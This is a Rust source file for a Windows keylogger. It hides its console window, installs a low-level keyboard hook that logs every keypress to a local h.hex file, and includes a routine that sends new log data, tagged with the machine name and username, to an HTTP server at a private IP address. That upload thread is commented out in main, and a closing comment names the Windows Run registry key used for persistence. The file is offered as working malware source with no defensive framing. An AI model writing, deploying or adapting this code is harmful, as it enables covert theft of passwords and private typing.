#![windows_subsystem = "windows"]
use windows::{
    Win32::{
        UI::WindowsAndMessaging::{
            CallNextHookEx, SetWindowsHookExW, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, GetMessageW, DispatchMessageW, TranslateMessage, MSG, HHOOK, WM_KEYDOWN, WH_KEYBOARD_LL
        },
        Foundation::{
            HINSTANCE, WPARAM, LPARAM, LRESULT, HWND
        },
        System::{
            WindowsProgramming::GetUserNameW,
            SystemInformation::{GetComputerNameExW, COMPUTER_NAME_FORMAT} 
        },
    },
    core::PWSTR
};
use std::{
    mem::transmute,
    io::{Read, Write, SeekFrom, prelude::Seek},
    thread::sleep,
    time::Duration,
    slice::from_raw_parts,
    usize,
    fs::{File, metadata, OpenOptions},
    thread::spawn,
    env::current_exe,
    path::PathBuf
};
use serde_json::json;
use reqwest::blocking::Client;
use reqwest::blocking::multipart;

//https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getcomputernameexw

fn get_host_name() -> String {
    let mut cb_buffer = 257_u32;
    let mut buffer =  Vec::<u16>::with_capacity(cb_buffer as usize);
    let lp_buffer = PWSTR(buffer.as_mut_ptr());

    let status = unsafe {
        GetComputerNameExW(COMPUTER_NAME_FORMAT(0), lp_buffer, &mut cb_buffer)
    };

    if status.is_err() {return "Error".into()}

    return String::from_utf16_lossy(unsafe{std::slice::from_raw_parts(lp_buffer.0, cb_buffer as usize)})
}

fn get_current_user() -> String {
    let mut cb_buffer = 257_u32;
    let mut buffer = Vec::<u16>::with_capacity(cb_buffer as usize);
    let lp_buffer = PWSTR(buffer.as_mut_ptr());

    unsafe {
        let success = GetUserNameW(lp_buffer, &mut cb_buffer);

        if success.is_err() {return "Error".into()}

        let user_name = String::from_utf16_lossy(from_raw_parts(lp_buffer.0, cb_buffer as usize - 1));

        return user_name
    }
}

fn get_file_size(file_path: &PathBuf) -> u64 {
    if let Ok(file_metadata) = metadata(file_path) {
        file_metadata.len()
    } else {0}
}

fn upload_file() {
    let exe_path = current_exe().unwrap();
    let hex_file_path = exe_path.parent().unwrap().join("h.hex");

    let mut last_file_size: u64 = 0;
    loop {
        sleep(Duration::from_secs(5));
        let current_file_size: u64 = get_file_size(&hex_file_path); // if current file size is LESS THAN the last file size then reset last file size

        if current_file_size > last_file_size {
            let url = "http://172.26.108.188:8082/UploadFile";

            let mut file = File::open(&hex_file_path).expect("Failed to open file");
            let mut content = Vec::new();

            file.seek(SeekFrom::Start(last_file_size)).expect("Failed to set seek"); // Will send the whole file when the program first starts

            last_file_size = current_file_size; //Update the varible here so that the seek can work

            file.read_to_end(&mut content).expect("Failed to read file");

            let json_data = json!({
                "MachineName": get_host_name(),
                "Username": get_current_user()
            });

            let client = Client::new();

            let form = multipart::Form::new()
            .part("file", multipart::Part::bytes(content)
            .file_name("getloginhere.hex")
            .mime_str("application/octet-stream").unwrap())
            .part("json_data", multipart::Part::text(serde_json::to_string(&json_data).unwrap())
            .mime_str("application/json").unwrap());

            if let Ok(res) = client.post(url).multipart(form).send() {
                println!("Response: {:?}", res);
            } else {
                eprintln!("Failed to send request");
            }
        } else if current_file_size < last_file_size {
            dbg!("File has been deleted and a replacement has been created!");
            last_file_size = 0;
        }
    }
}

fn append_keycode_to_file(keycode: u32) -> std::io::Result<()> {
    let exe_path = current_exe().unwrap();
    let hex_file_path = exe_path.parent().unwrap().join("h.hex");

    let mut file = OpenOptions::new().create(true).append(true).open(hex_file_path)?;

    file.write_all(&keycode.to_ne_bytes())?;
    
    Ok(())
}

unsafe extern "system" fn keyboard_callback(code: i32, wp: WPARAM, lp: LPARAM) -> LRESULT {
    if code >= 0 && wp.0 as u32 == WM_KEYDOWN {
        let vk_code = (*transmute::<LPARAM, *const KBDLLHOOKSTRUCT>(lp)).vkCode;
        let _ = append_keycode_to_file(vk_code).unwrap();
        /*
        if let Ok(vk_code_u8) = u8::try_from(vk_code) {
            let _ = append_keycode_to_file(vk_code_u8).unwrap();
        }
        */
    }
    CallNextHookEx(HHOOK::default(), code, wp, lp)
}

fn message_loop() {
    let mut message = MSG::default();
    unsafe {
        loop {
            GetMessageW(&mut message, HWND::default(), 0, 0);
            TranslateMessage(&message);
            DispatchMessageW(&message);
        }
    }
}

fn main() {
    let hook = unsafe {SetWindowsHookExW(
        WH_KEYBOARD_LL,
        Some(keyboard_callback),
        HINSTANCE::default(),
        0
    ).unwrap()};
    //let _upload_thread = spawn(|| {
        //upload_file();
    //});
    message_loop();
    //std::io::stdin().read_line(&mut String::new()).unwrap(); //End on enter.
    unsafe{UnhookWindowsHookEx(hook).unwrap()};
}

/*\
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
DOCS
https://learn.microsoft.com/en-us/windows/win32/winmsg/using-messages-and-message-queues
https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dispatchmessagew
https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessagew
https://stackoverflow.com/questions/75870904/how-to-correctly-set-a-wh-keyboard-hook-procedure-using-setwindowshookexw-in-rus
https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644984(v=vs.85)
*/